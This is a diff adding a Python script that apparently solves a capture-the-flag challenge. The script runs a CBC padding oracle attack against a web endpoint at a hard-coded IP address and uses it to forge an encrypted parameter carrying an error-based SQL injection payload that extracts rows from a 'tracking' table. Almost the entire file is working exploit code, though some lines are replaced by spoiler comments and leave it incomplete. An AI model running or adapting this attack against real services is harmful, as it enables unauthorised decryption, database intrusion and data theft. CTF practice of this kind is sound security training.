@@ -1,0 +1,76 @@
+import requests
+import struct
+import base64
+
+pad = lambda x : x + chr(16-len(x)%16)*(16-len(x)%16)
+url = "http://34.74.105.127/c7b8202507/?post="
+text = '{"id":"-1 union (select 1,user() from(select count(*),concat(0x3a,(select substr(group_concat(id,headers),50,150)from tracking),0x3a,floor(rand(0)*2))x from information_schema.tables group by x)z)"}'
+text = pad(text)
+
+def ctfDecrypt(initString,whatToDecrypt):
+	#x = base64.b64decode(cipher64.replace('~', '=').replace('!', '/').replace('-', '+'))
+	x = initString + whatToDecrypt
+#x = x[:-32]
+	tmp = ""
+	afterDecrypt = ""
+	for j in range(1,17):
+		if afterDecrypt != "":
+			# ** spoiler **
+			tmp = hex(tmp)[2:]
+			print("tmp = " + tmp)
+			if tmp[-1:] == "L" :
+				tmp = tmp[:-1]
+			if len(tmp) %2 != 0 :
+				tmp = "0" + tmp
+			if len(tmp) != len(afterDecrypt.encode("hex")):
+				tmp = "00"+tmp
+			tmp = tmp.decode("hex")
+		for i in range(0,256):
+    #** spoiler **
+			cipher64 = base64.b64encode(decodedCipher).replace("=","~").replace("/","!").replace("+","-")
+			responce = requests.get(url+cipher64)
+			text = responce.text
+			if text.find("PaddingException") == -1 :
+				#** spoiler **
+				a = int(afterDecrypt.encode("hex"),16)
+				b = int(x[-32:-16].encode("hex"),16)
+				res = a ^ b
+				res = hex(res)[2:]
+				if res[-1] == "L":
+					res = res[:-1]
+				if len(res) %2 == 1:
+					res = "0"+res
+				print(res.decode("hex")[-len(afterDecrypt):])
+				print("afterDecrypt = " + afterDecrypt.encode("hex"))
+				print(i)
+				print(text)
+				print("\n\n")
+				break
+	return afterDecrypt
+
+#ctfDecrypt("3ebd0875d98f8eee2c83231d274311a3".decode("hex"),"00a7d69bbe61033522e8da12ffa7cd95".decode("hex"))
+#exit()
+
+init = "0f765c5ca91b451d90e0e8c8a77f6c88"
+result = "41"*16
+tmp = int(text[-16:].encode("hex"),16) ^ int(init,16)
+text = text[:-16]
+result = hex(tmp)[2:-1]+ result
+l = len(text)/16
+tmp = hex(tmp)[2:]
+for i in range(l):
+	arg = tmp 
+	if arg[-1] == "L":
+		arg = arg[:-1]
+	if len(arg) != 32:
+		arg = "0" * (32 - len(arg)) + arg
+	arg = arg.decode("hex")
+	assert(len(arg) == 16)
+	init =ctfDecrypt("\x01"*16,arg)
+	tmp = int(text[-16:].encode("hex"),16) ^ int(init.encode("hex"),16)
+	tmp = hex(tmp)[2:-1]
+	if len(tmp) != 32 :
+		tmp = "0"*(32-len(tmp)) + tmp
+	text = text[:-16]
+	result = tmp+" " + result
+	print(result)
